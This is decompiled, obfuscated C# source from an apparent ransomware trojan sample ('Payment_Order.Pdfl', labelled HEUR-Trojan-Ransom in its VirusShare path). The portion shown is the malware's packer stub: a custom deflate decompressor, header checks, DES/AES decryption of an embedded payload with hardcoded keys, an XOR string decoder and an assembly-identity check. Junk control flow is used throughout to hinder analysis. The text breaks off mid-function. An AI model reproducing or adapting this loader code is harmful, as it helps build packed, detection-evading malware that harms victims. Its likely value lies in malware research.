// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Payment_Order.Pdfl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A0B7B02-48AD-4BCD-857B-6ECC9462751D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00041-msil\HEUR-Trojan-Ransom.Win32.Generic-2c53f9eb7a2f7de6f8854ae68c59b64dc95bab680b27a694d4a2bc16de9d6e5b.exe

using \u0007;
using \u0084;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0084
{
  internal class \u0081
  {
    static int \u008E\u0017\u0007([In] \u000E.\u0012 obj0) => 32768 - obj0.\u0003;

    static int \u0002\u0016\u0007([In] \u000E.\u0011 obj0, [In] int obj1)
    {
      while (obj0.\u0005 < obj1)
      {
        if (obj0.\u0002 == obj0.\u0003)
        {
          if (true)
          {
            if (true)
              return -1;
          }
          else
            break;
        }
        else if (true)
        {
          \u000E.\u0011 obj2 = obj0;
          int num1 = (int) obj2.\u0004;
          byte[] numArray1 = obj0.\u0001;
          \u000E.\u0011 obj3 = obj0;
          int num2;
          int num3 = num2 = obj3.\u0002;
          obj3.\u0002 = num2 + 1;
          int index1 = num3;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = obj0.\u0001;
          \u000E.\u0011 obj4 = obj0;
          int num5;
          int num6 = num5 = obj4.\u0002;
          obj4.\u0002 = num5 + 1;
          int index2 = num6;
          int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num8 = (num4 | num7) << obj0.\u0005;
          obj2.\u0004 = (uint) (num1 | num8);
        }
        else
          continue;
        obj0.\u0005 += 16;
        break;
      }
      long num9 = (long) obj0.\u0004;
      int num10 = 1;
      int num11 = obj1;
      int num12;
      do
      {
        if (true)
        {
          int num13 = num11 & 31;
          num12 = num10 << num13;
          if (true)
          {
            num11 = 1;
            num10 = num12;
          }
          else
            goto label_15;
        }
      }
      while (num11 == 0);
      int num14 = num10 - num11;
      goto label_13;
label_15:
      num14 = num12;
label_13:
      long num15 = (long) num14;
      return (int) (num9 & num15);
    }

    static unsafe int \u001B\u0014\u0007([In] \u000E.\u0012 obj0, [In] \u000E.\u0011 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int val1 = obj2;
      int val2 = 32768;
      if (val2 != 0)
        val2 -= obj0.\u0003;
      obj2 = Math.Min(Math.Min(val1, val2), \u0081.\u0098\u0017\u0007(obj1));
      *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0002;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u0081.\u0084\u0015\u0007(obj1, obj0.\u0001, obj0.\u0002, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u0081.\u0084\u0015\u0007(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u0081.\u0084\u0015\u0007(obj1, obj0.\u0001, obj0.\u0002, obj2);
      obj0.\u0002 = obj0.\u0002 + *(int*) voidPtr & (int) short.MaxValue;
      obj0.\u0003 += *(int*) voidPtr;
      return *(int*) voidPtr;
    }

    static int \u0005\u0017\u0007([In] \u000E.\u0016 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static unsafe int \u0084\u0015\u0007([In] \u000E.\u0011 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      int num3;
      while (true)
      {
        int num4 = obj0.\u0005;
        int num5 = 0;
        while (true)
        {
          if (num5 == 0)
          {
            if (num4 <= num5 || obj3 <= 0)
            {
              if (obj3 != 0)
              {
                *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0003 - obj0.\u0002;
                int num6 = obj3;
                num5 = *(int*) ((IntPtr) voidPtr + 4);
                num4 = num6;
              }
              else
                break;
            }
            else
              goto label_21;
          }
          if (num4 > num5)
            obj3 = *(int*) ((IntPtr) voidPtr + 4);
          do
          {
            Array.Copy((Array) obj0.\u0001, obj0.\u0002, (Array) obj1, obj2, obj3);
          }
          while (false);
          obj0.\u0002 += obj3;
          num1 = obj0.\u0002;
          if (true)
          {
            int num7 = obj0.\u0003;
            num2 = num1 - num7;
            num3 = 1;
            if (num3 == 0)
            {
              num5 = num3;
              num4 = num2;
            }
            else
              goto label_15;
          }
          else
            goto label_20;
        }
        if (false)
          goto label_22;
        else
          break;
label_21:
        obj1[obj2++] = (byte) obj0.\u0004;
        if (true)
        {
          obj0.\u0004 >>= 8;
          obj0.\u0005 -= 8;
          --obj3;
        }
        else
          goto label_16;
label_22:
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      return *(int*) voidPtr;
label_15:
      if ((num2 & num3) == 0)
        goto label_19;
label_16:
      if (true)
        obj0.\u0004 = (uint) obj0.\u0001[obj0.\u0002++] & (uint) byte.MaxValue;
      obj0.\u0005 = 8;
label_19:
      num1 = *(int*) voidPtr;
label_20:
      int num8 = obj3;
      return num1 + num8;
    }

    static void \u0005\u0018\u0007([In] int obj0, [In] \u000E.\u0011 obj1, [In] int obj2, [In] byte[] obj3)
    {
      if (true)
        goto label_6;
label_4:
      obj1.\u0005 += 8;
label_5:
      obj1.\u0001 = obj3;
      obj1.\u0002 = obj0;
      int num;
      obj1.\u0003 = num;
      return;
label_6:
      if (obj1.\u0002 < obj1.\u0003)
        throw new InvalidOperationException();
      num = obj0 + obj2;
      if (0 > obj0 || obj0 > num || num > obj3.Length)
        throw new ArgumentOutOfRangeException();
      if ((obj2 & 1) != 0)
      {
        obj1.\u0004 |= (uint) (((int) obj3[obj0++] & (int) byte.MaxValue) << obj1.\u0005);
        goto label_4;
      }
      else
        goto label_5;
    }

    static unsafe byte[] \u0090\u0015\u0007([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_47;
label_7:
      \u000E.\u0016 obj1;
      *(int*) ((IntPtr) voidPtr + 12) = \u0081.\u0081\u0014\u0007(obj1);
      byte[] numArray1;
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 16) = \u0081.\u0005\u0017\u0007(obj1);
        *(int*) ((IntPtr) voidPtr + 20) = \u0081.\u0005\u0017\u0007(obj1);
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
        }
        if (*(int*) ((IntPtr) voidPtr + 20) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
        }
        long length = obj1.Length;
        if (true)
        {
          long position = obj1.Position;
          length -= position;
        }
        byte[] buffer1 = new byte[length];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u000E.\u000F obj2 = new \u000E.\u000F(buffer1);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        \u0081.\u0084\u0016\u0007(0, obj2, numArray1.Length, numArray1);
        goto label_46;
      }
label_23:
      byte[] numArray2 = new byte[8]
      {
        (byte) 33,
        (byte) 171,
        (byte) 166,
        (byte) 147,
        (byte) 136,
        (byte) 194,
        (byte) 9,
        (byte) 152
      };
      \u0008 obj3 = new \u0008();
      byte[] numArray3;
      try
      {
        if (true)
        {
          using (ICryptoTransform cryptoTransform = \u0081.\u001E\u0016\u0007(numArray3, numArray2, true, obj3))
            numArray1 = \u0081.\u0090\u0015\u0007(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      finally
      {
        while (obj3 != null)
        {
          if (true)
          {
            ((IDisposable) obj3).Dispose();
            break;
          }
        }
      }
label_34:
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
      {
        byte[] numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray5 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0006 obj4 = new \u0006())
        {
          if (true)
          {
            using (ICryptoTransform cryptoTransform = \u0081.\u009C\u0016\u0007(numArray4, true, numArray5, obj4))
              numArray1 = \u0081.\u0090\u0015\u0007(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
      }
label_46:
      obj1.Close();
      return numArray1;
label_47:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0081.\u0082\u0014\u0007(executingAssembly, callingAssembly))
        return (byte[]) null;
      obj1 = new \u000E.\u0016(obj0);
      numArray1 = new byte[0];
      *(int*) voidPtr = \u0081.\u0081\u0014\u0007(obj1);
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) \u0081.\u0005\u0017\u0007(obj1);
        *(int*) ((IntPtr) voidPtr + 4) = \u0081.\u0005\u0017\u0007(obj1);
      }
      else
        goto label_15;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = \u0081.\u0005\u0017\u0007(obj1);
      if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
        throw new FormatException("Wrong Header Signature");
      \u0081.\u0081\u0014\u0007(obj1);
      \u0081.\u0081\u0014\u0007(obj1);
      \u0081.\u0081\u0014\u0007(obj1);
      goto label_7;
label_15:
      *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
      if (*(int*) voidPtr != 8223355)
        throw new FormatException("Unknown Header");
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = \u0081.\u0081\u0014\u0007(obj1);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
          {
            *(int*) ((IntPtr) voidPtr + 36) = \u0081.\u0081\u0014\u0007(obj1);
            *(int*) ((IntPtr) voidPtr + 40) = \u0081.\u0081\u0014\u0007(obj1);
            byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 36)];
            obj1.Read(buffer, 0, buffer.Length);
            \u000E.\u000F obj5 = new \u000E.\u000F(buffer);
            \u0081.\u0084\u0016\u0007(*(int*) ((IntPtr) voidPtr + 32), obj5, *(int*) ((IntPtr) voidPtr + 40), numArray1);
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
          }
        }
        if (*(int*) ((IntPtr) voidPtr + 24) == 2)
        {
          numArray3 = new byte[8]
          {
            (byte) 11,
            (byte) 147,
            (byte) 232,
            (byte) 162,
            (byte) 52,
            (byte) 86,
            (byte) 116,
            (byte) 152
          };
          goto label_23;
        }
        else
          goto label_34;
      }
      else
        goto label_4;
    }

    static unsafe bool \u008E\u0016\u0007([In] \u000E.\u0014 obj0, [In] \u000E.\u0011 obj1)
    {
      int num1 = 8;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        goto label_43;
      }
label_2:
      int num2;
      int num3;
      int num4;
      int num5;
      switch (num1)
      {
        case 0:
          obj0.\u0007 = \u0081.\u0002\u0016\u0007(obj1, 5);
          if (obj0.\u0007 < 0)
            return false;
          obj0.\u0007 += 257;
          \u0081.\u0001\u0017\u0007(obj1, 5);
          obj0.\u0006 = 1;
          goto case 1;
        case 1:
          obj0.\u0008 = \u0081.\u0002\u0016\u0007(obj1, 5);
          if (obj0.\u0008 >= 0)
          {
            ++obj0.\u0008;
            \u0081.\u0001\u0017\u0007(obj1, 5);
            obj0.\u000F = obj0.\u0007 + obj0.\u0008;
            obj0.\u0004 = new byte[obj0.\u000F];
            obj0.\u0006 = 2;
            goto case 2;
          }
          else
            break;
        case 2:
          obj0.\u000E = \u0081.\u0002\u0016\u0007(obj1, 4);
          if (obj0.\u000E < 0)
            return false;
          obj0.\u000E += 4;
          \u0081.\u0001\u0017\u0007(obj1, 4);
          obj0.\u0003 = new byte[19];
          obj0.\u0012 = 0;
          goto label_12;
        case 3:
label_19:
          num4 = obj0.\u0012;
          num5 = obj0.\u000E;
          if (true)
          {
            if (num4 < num5)
            {
              *(int*) voidPtr = \u0081.\u0002\u0016\u0007(obj1, 3);
              goto label_14;
            }
            else
            {
              obj0.\u0005 = new \u000E.\u0013(obj0.\u0003);
              obj0.\u0003 = (byte[]) null;
              obj0.\u0012 = 0;
              if (true)
              {
                obj0.\u0006 = 4;
                goto case 4;
              }
              else
                break;
            }
          }
          else
            goto label_25;
        case 4:
label_27:
          int num6;
          if (((num6 = \u0081.\u000E\u0015\u0007(obj0.\u0005, obj1)) & -16) == 0)
          {
            if (true)
            {
              byte[] numArray = obj0.\u0004;
              num2 = obj0.\u0012++;
              int index = num2;
              int num7 = (int) (obj0.\u0011 = (byte) num6);
              numArray[index] = (byte) num7;
              int num8 = obj0.\u0012;
              num5 = obj0.\u000F;
              num4 = num8;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
          {
            if (num6 < 0)
              return false;
            if (num6 >= 17)
              obj0.\u0011 = (byte) 0;
            obj0.\u0010 = num6 - 16;
            if (true)
            {
              obj0.\u0006 = 5;
              goto case 5;
            }
            else
              goto case 5;
          }
        case 5:
          *(int*) ((IntPtr) voidPtr + 4) = \u000E.\u0014.\u0002[obj0.\u0010];
          num3 = \u0081.\u0002\u0016\u0007(obj1, *(int*) ((IntPtr) voidPtr + 4));
          if (num3 < 0)
            return false;
          goto label_36;
        default:
          goto label_43;
      }
      return false;
label_12:
      obj0.\u0006 = 3;
      goto label_19;
label_14:
      int num9 = *(int*) voidPtr;
      if (false)
        return num9 != 0;
      if (num9 < 0)
        return false;
      \u0081.\u0001\u0017\u0007(obj1, 3);
      if (true)
      {
        obj0.\u0003[\u000E.\u0014.\u0013[obj0.\u0012]] = (byte) *(int*) voidPtr;
        ++obj0.\u0012;
        goto label_19;
      }
      else
        goto label_36;
label_25:
      if (num4 == num5)
        return true;
      goto label_27;
label_36:
      \u0081.\u0001\u0017\u0007(obj1, *(int*) ((IntPtr) voidPtr + 4));
      num3 += \u000E.\u0014.\u0001[obj0.\u0010];
      while (num3-- > 0)
      {
        byte[] numArray = obj0.\u0004;
        num2 = obj0.\u0012++;
        int index = num2;
        int num10 = (int) obj0.\u0011;
        numArray[index] = (byte) num10;
      }
      if (true)
      {
        if (obj0.\u0012 == obj0.\u000F)
          return true;
        obj0.\u0006 = 4;
      }
      else
        goto label_14;
label_43:
      int num11 = obj0.\u0006;
      if (true)
        num2 = num11;
      num1 = num2;
      goto label_2;
    }

    static void \u0001\u0017\u0007([In] \u000E.\u0011 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0004 >>= obj1;
      do
      {
        if (true)
          obj0.\u0005 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static void \u0086\u0016\u0007([In] \u0006 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0002, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static \u000E.\u0013 \u008C\u0017\u0007([In] \u000E.\u0014 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0007];
      Array.Copy((Array) obj0.\u0004, 0, (Array) destinationArray, 0, obj0.\u0007);
      return new \u000E.\u0013(destinationArray);
    }

    static void \u0011\u0015\u0007([In] \u000E.\u0012 obj0, [In] int obj1)
    {
label_0:
      do
      {
        \u000E.\u0012 obj2 = obj0;
        int num1;
        int num2 = num1 = obj2.\u0003;
        obj2.\u0003 = num1 + 1;
        do
        {
          if (true)
          {
            if (num2 != 32768)
              goto label_3;
label_2:
            goto label_0;
label_3:
            if (true)
            {
              byte[] numArray = obj0.\u0001;
              \u000E.\u0012 obj3 = obj0;
              int num3;
              num2 = num3 = obj3.\u0002;
              obj3.\u0002 = num3 + 1;
              int index = num2;
              int num4 = (int) (byte) obj1;
              numArray[index] = (byte) num4;
              if (false)
                goto label_2;
            }
            else
              goto label_0;
          }
          else
            goto label_0;
        }
        while (false);
        goto label_5;
      }
      while (false);
      goto label_7;
label_5:
      obj0.\u0002 &= (int) short.MaxValue;
      return;
label_7:
      throw new InvalidOperationException();
    }

    static bool \u0082\u0014\u0007([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    static bool \u0012\u0018\u0007([In] \u000E.\u0011 obj0) => obj0.\u0002 == obj0.\u0003;

    static \u000E.\u0013 \u001A\u0014\u0007([In] \u000E.\u0014 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0008];
      Array.Copy((Array) obj0.\u0004, obj0.\u0007, (Array) destinationArray, 0, obj0.\u0008);
      return new \u000E.\u0013(destinationArray);
    }

    static void \u0015\u0015\u0007([In] \u000E.\u0012 obj0, [In] int obj1, [In] int obj2)
    {
      if ((obj0.\u0003 += obj1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = obj0.\u0002 - obj2 & (int) short.MaxValue;
      int num = 32768 - obj1;
      if (sourceIndex <= num && obj0.\u0002 < num)
      {
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0002, obj1);
          obj0.\u0002 += obj1;
        }
        else
        {
          while (obj1-- > 0)
            obj0.\u0001[obj0.\u0002++] = obj0.\u0001[sourceIndex++];
        }
      }
      else
        \u0081.\u0004\u0015\u0007(obj0, sourceIndex, obj1, obj2);
    }

    static ICryptoTransform \u001E\u0016\u0007(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] bool obj2,
      [In] \u0008 obj3)
    {
      obj3.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0002, new object[1]
      {
        (object) obj0
      });
      obj3.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0002, new object[1]
      {
        (object) obj1
      });
      return (ICryptoTransform) obj3.\u0001.GetMethod(obj2 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj3.\u0002, new object[0]);
    }

    static unsafe byte[] \u0087\u007F\u0007([In] string obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      byte[] bytes = Encoding.Default.GetBytes(obj0);
      *(int*) voidPtr = (int) obj1[checked (obj1.Length - 1)] ^ 112;
      byte[] arySrc = new byte[checked (obj1.Length + 1)];
      IntPtr num = (IntPtr) voidPtr + 8;
      *(int*) ((IntPtr) voidPtr + 12) = checked (obj1.Length - 1);
      *(int*) num = 0;
      do
      {
        while (*(int*) ((IntPtr) voidPtr + 8) <= *(int*) ((IntPtr) voidPtr + 12))
        {
          arySrc[*(int*) ((IntPtr) voidPtr + 8)] = checked ((byte) ((int) obj1[*(int*) unchecked ((IntPtr) voidPtr + 8)] ^ *(int*) voidPtr ^ (int) bytes[*(int*) unchecked ((IntPtr) voidPtr + 4)]));
          if (*(int*) ((IntPtr) voidPtr + 4) == checked (obj0.Length - 1))
            *(int*) ((IntPtr) voidPtr + 4) = 0;
          else
            *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
          *(int*) ((IntPtr) voidPtr + 8) = checked (*(int*) unchecked ((IntPtr) voidPtr + 8) + 1);
        }
        arySrc = (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (obj1.Length - 2 + 1)]);
      }
      while (false);
      return arySrc;
    }

    static unsafe int \u000F\u0018\u0007([In] int obj0, [In] byte[] obj1, [In] \u000E.\u0012 obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1;
      int num2;
      do
      {
        *(int*) voidPtr = obj2.\u0002;
        num1 = obj0;
        num2 = obj2.\u0003;
        if (true)
        {
          if (true)
          {
            if (num1 <= num2)
              goto label_17;
            else
              goto label_16;
label_4:
            *(int*) ((IntPtr) voidPtr + 4) = obj0;
            continue;
label_16:
            obj0 = obj2.\u0003;
            goto label_4;
label_17:
            *(int*) voidPtr = obj2.\u0002 - obj2.\u0003 + obj0 & (int) short.MaxValue;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_12;
      }
      while (false);
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj0 - *(int*) voidPtr;
        int num3 = *(int*) ((IntPtr) voidPtr + 8);
        int num4 = 0;
        if (num4 == 0)
        {
          if (num3 > num4)
            Array.Copy((Array) obj2.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj1, obj3, *(int*) ((IntPtr) voidPtr + 8));
          else
            goto label_11;
        }
        else
        {
          num2 = num4;
          num1 = num3;
          goto label_10;
        }
      }
      int num5 = obj3;
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      num1 = num5;
label_10:
      obj3 = num1 + num2;
      obj0 = *(int*) voidPtr;
label_11:
      Array.Copy((Array) obj2.\u0001, *(int*) voidPtr - obj0, (Array) obj1, obj3, obj0);
      obj2.\u0003 -= *(int*) ((IntPtr) voidPtr + 4);
      int num6 = obj2.\u0003;
      num2 = 0;
      num1 = num6;
label_12:
      if (num1 < num2)
        throw new InvalidOperationException();
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0088\u007F\u0007([In] int obj0)
    {
      if (false)
        return;
      Stopwatch stopwatch1 = new Stopwatch();
      do
      {
        Stopwatch stopwatch2 = stopwatch1;
        if (true)
          goto label_6;
label_1:
        while (stopwatch1.ElapsedMilliseconds < (long) obj0)
          Application.DoEvents();
        continue;
label_6:
        stopwatch2.Start();
        goto label_1;
      }
      while (false);
      stopwatch1.Stop();
    }

    static int \u0081\u0014\u0007([In] \u000E.\u0016 obj0) => \u0081.\u0005\u0017\u0007(obj0) | \u0081.\u0005\u0017\u0007(obj0) << 16;

    static unsafe void \u008D\u0014\u0007([In] \u000E.\u0013 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj1[*(int*) voidPtr];
        if (*(int*) ((IntPtr) voidPtr + 4) > 0)
        {
          int[] numArray3;
          int index;
          int num = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
          numArray3[index] = num;
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 512;
      *(int*) ((IntPtr) voidPtr + 16) = 1;
      while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
        if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      obj0.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
      *(int*) ((IntPtr) voidPtr + 28) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = 15;
      if (true)
        goto label_15;
label_12:
      *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
      *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
label_13:
      if (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
      {
        obj0.\u0001[(int) \u0081.\u008A\u0015\u0007(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
        goto label_12;
      }
      else
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
label_15:
      if (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
        goto label_13;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < obj1.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) obj1[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u0081.\u008A\u0015\u0007(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
    }

    static unsafe bool \u0018\u0014\u0007([In] \u000E.\u000F obj0)
    {
      // ISSUE: untyped stack allocation
